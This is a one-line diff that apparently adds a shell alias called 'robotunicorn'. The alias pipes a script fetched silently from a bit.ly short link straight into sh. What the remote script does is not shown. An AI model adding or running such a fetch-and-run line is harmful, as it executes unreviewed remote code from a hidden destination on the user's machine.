@@ -1,0 +1,1 @@
+alias robotunicorn='curl -Ls bit.ly/lampounicorn | sh'
